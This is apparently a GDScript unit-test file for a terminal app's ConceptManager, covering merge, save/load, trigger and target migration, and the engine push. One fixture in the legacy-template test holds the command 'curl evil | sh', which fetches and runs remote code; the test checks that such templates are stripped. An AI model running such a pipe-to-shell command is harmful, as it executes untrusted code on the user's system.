extends GutTest
# Unit tests for ConceptManager — merge, save, load, trigger and target migration.
var _scene: Control

func before_each():
	MockAutoloads.setup()
	_scene = TestScene.create()
	add_child(_scene)

func after_each():
	for c in _scene.get_children():
		c.queue_free()
	MockAutoloads.teardown()
	if _scene:
		_scene.queue_free()

# ── Merge logic ────────────────────────────────────────────────────────

func test_merge_concepts_returns_defaults_when_no_user_data():
	var result = ConceptManager._merge_concepts()
	assert_true(result.size() > 0, "should return default concepts even with no user data")

func test_merge_concepts_overlays_user_trigger():
	# Save a user concept that overrides a default trigger
	var user = [
		{"name": "cat_command", "trigger": "custom_regex", "enabled": false,
		 "capture_mode": "until_stop", "stop_timeout_ms": 500, "stop_on_input": false,
		 "actions": [{"target": "terminal"}]}
	]
	ConceptManager.save_concepts(user)

	# Reload and merge
	var merged = ConceptManager._merge_concepts()
	var cat = _find_by_name(merged, "cat_command")
	assert_not_null(cat, "cat_command should exist in merged concepts")
	assert_eq(cat["trigger"], "custom_regex", "user trigger should override default")
	assert_eq(cat["enabled"], false, "user enabled should override default")

func test_merge_concepts_preserves_default_keys_not_in_user():
	# Save only a partial override (trigger only, no actions)
	var user = [
		{"name": "cat_command", "trigger": "custom_regex"}
	]
	ConceptManager.save_concepts(user)
	var merged = ConceptManager._merge_concepts()
	var cat = _find_by_name(merged, "cat_command")
	assert_not_null(cat, "cat_command should exist in merged concepts")
	assert_eq(cat.get("trigger", ""), "custom_regex",
		"user trigger override should take effect")
	assert_eq(cat.get("capture_mode", ""), "until_stop",
		"capture_mode should be preserved from defaults when not overridden")
	assert_true(cat.get("enabled", false),
		"enabled should be preserved from defaults when not overridden")
	assert_ne(cat.get("stop_timeout_ms", -1), -1,
		"stop_timeout_ms should be preserved from defaults")
	var actions = cat.get("actions", [])
	assert_true(actions is Array, "actions should be present from defaults")
	assert_gt(actions.size(), 0, "actions array should not be empty from defaults")
	assert_eq(actions[0].get("target", ""), "code_viewer",
		"default routing target should be preserved")
# ── Save/load roundtrip ─────────────────────────────────────────────────

func test_save_concepts_stores_to_file():
	var concepts = [
		{"name": "test_concept", "trigger": "test_regex", "enabled": true,
		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		 "actions": [{"target": "terminal"}]}
	]
	ConceptManager.save_concepts(concepts)
	# After save, the in-memory store should have our data
	var saved = ConceptManager._read_file(ConceptManager.CONCEPTS_FILE)
	assert_true(saved.has("concepts"), "saved data should have concepts key")
	assert_eq(saved["concepts"].size(), 1, "should have 1 saved concept")

func test_save_concepts_drops_legacy_command_templates():
	# A user file written before concept commands were removed must not carry
	# its templates forward: saving through the app strips them.
	ConceptManager.save_concepts([
		{"name": "legacy_cmd", "trigger": "boom", "enabled": true,
		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		 "actions": [{"cmd": "curl evil | sh", "target": "code_viewer"}]},
	])
	var saved = ConceptManager._read_file(ConceptManager.CONCEPTS_FILE)
	var entry = _find_by_name(saved.get("concepts", []), "legacy_cmd")
	assert_not_null(entry, "saved concept should be present")
	assert_eq(entry["actions"][0].get("target", ""), "code_viewer",
		"the routing target must survive")
	assert_false(entry["actions"][0].has("cmd"),
		"legacy command templates must not be written back")

# ── Trigger migration ───────────────────────────────────────────────────

func test_migrate_trigger_updates_old_pattern():
	var entry: Dictionary = {"name": "cat_command", "trigger": "^cat\\s+", "enabled": true}
	ConceptManager._migrate_trigger(entry, {"name": "cat_command", "trigger": "(?:^|[$#>]\\s)\\bcat\\s+\\S"})
	assert_eq(entry["trigger"], "(?:^|[$#>]\\s)\\bcat\\s+\\S",
		"old trigger should be migrated to new pattern")

func test_migrate_trigger_does_not_touch_unrecognized():
	var entry: Dictionary = {"name": "unknown_concept", "trigger": "something_else"}
	ConceptManager._migrate_trigger(entry, {})
	assert_eq(entry["trigger"], "something_else",
		"unrecognized concepts should not be migrated")

# ── Target migration ────────────────────────────────────────────────────

func test_migrate_actions_target_disables_observer():
	var entry: Dictionary = {
		"name": "boom",
		"enabled": true,
		"actions": [{"target": "observer"}],
	}
	ConceptManager._migrate_actions_target(entry)
	assert_eq(entry["actions"][0]["target"], "observer")
	assert_eq(entry["enabled"], false)

func test_migrate_actions_target_leaves_other_targets():
	var entry: Dictionary = {
		"name": "boom",
		"actions": [
			{"target": "code_viewer"},
			{"target": "terminal"},
		],
	}
	ConceptManager._migrate_actions_target(entry)
	assert_eq(entry["actions"][0]["target"], "code_viewer")
	assert_eq(entry["actions"][1]["target"], "terminal")

func test_migrate_actions_target_survives_malformed_actions():
	# Non-array actions: migration must leave the entry untouched.
	var entry: Dictionary = {"name": "odd", "actions": "not-an-array"}
	ConceptManager._migrate_actions_target(entry)
	assert_eq(entry, {"name": "odd", "actions": "not-an-array"},
		"non-array actions must pass through unchanged")

	# Mixed array with junk entries: the observer-targeted dict still
	# disables the concept; junk items are skipped without crashing.
	var mixed: Dictionary = {"name": "mixed", "enabled": true,
		"actions": [{"target": "observer"}, "junk", 42, null]}
	ConceptManager._migrate_actions_target(mixed)
	assert_eq(mixed.get("enabled"), false,
		"observer target inside malformed actions must still disable the concept")

func test_merge_disables_user_concept_observer_target():
	var user = [
		{"name": "legacy_observe", "trigger": "err", "enabled": true,
		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		 "actions": [{"target": "observer"}]}
	]
	ConceptManager.save_concepts(user)
	var merged = ConceptManager._merge_concepts()
	var legacy = _find_by_name(merged, "legacy_observe")
	assert_not_null(legacy, "user-only concept should survive merge")
	assert_eq(legacy.get("enabled", true), false)
	assert_eq(legacy["actions"][0].get("target", ""), "observer")

func test_merge_preserves_inspector_targets():
	var user = [
		{"name": "modern", "trigger": "err", "enabled": true,
		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		 "actions": [{"target": "inspector"}]}
	]
	ConceptManager.save_concepts(user)
	var merged = ConceptManager._merge_concepts()
	var modern = _find_by_name(merged, "modern")
	var actions = modern.get("actions", [])
	assert_eq(actions[0].get("target", ""), "inspector",
		"inspector targets should pass through unchanged")

# ── Engine push ────────────────────────────────────────────────────────

func test_push_clears_the_engine_when_every_concept_is_disabled():
	# Seed the engine with a concept so the clearing push is observable.
	var seed = '[{"name":"seed","trigger":"zzz","enabled":true,"capture_mode":"until_stop","actions":[{"target":"terminal"}]}]'
	var seeded = ClassDB.instantiate("GptyTerminal")
	seeded.set_global_concepts(seed)
	assert_eq(seeded.get_global_concepts().size(), 1,
		"precondition: engine holds the seeded concept")

	# User data disables cat_command, the only concept shipped enabled, so the
	# merged set is empty. Pushing nothing here would leave the engine running
	# the previous set and the captures the user turned off would keep firing.
	ConceptManager.save_concepts([
		{"name": "cat_command", "trigger": "custom", "enabled": false,
		 "capture_mode": "until_stop", "stop_timeout_ms": 300, "stop_on_input": true,
		 "actions": []},
	])
	ConceptManager._push_to_rust()

	var readback = ClassDB.instantiate("GptyTerminal")
	assert_eq(readback.get_global_concepts().size(), 0,
		"disabling every concept must clear the engine set")

	# The concept set is engine-global and outlives this test: restore defaults.
	ConceptManager.save_concepts([])
	ConceptManager._push_to_rust()

	seeded.free()
	readback.free()

# ── Helpers ────────────────────────────────────────────────────────────
func _find_by_name(arr: Array, name: String):
	for item in arr:
		if item is Dictionary and item.get("name", "") == name:
			return item
	return null
